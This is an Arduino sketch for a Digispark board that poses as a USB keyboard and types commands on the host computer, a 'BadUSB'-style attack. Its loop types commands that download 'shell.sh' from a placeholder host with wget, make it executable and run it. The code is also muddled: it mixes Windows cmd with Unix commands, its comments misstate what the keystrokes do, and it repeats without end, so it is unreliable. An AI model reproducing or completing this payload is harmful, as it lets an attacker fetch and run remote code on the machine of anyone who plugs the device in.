#include <DigiUSB.h>
#include <DigiKeyboard.h>

void setup() {
  DigiUSB.begin();
  DigiKeyboard.begin();
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_LWIN, MOD_CONTROL_LEFT); // Open Terminal on Windows
  delay(1000);
  DigiKeyboard.println("cmd"); // Open Command Prompt
  delay(1000);
  DigiKeyboard.println("wget http://yourwebsite.com/shell.sh"); // Download shell
  delay(2000);
  DigiKeyboard.println("chmod +x shell.sh"); // Make the shell executable
  delay(2000);
  DigiKeyboard.println("./shell.sh"); // Run the shell
}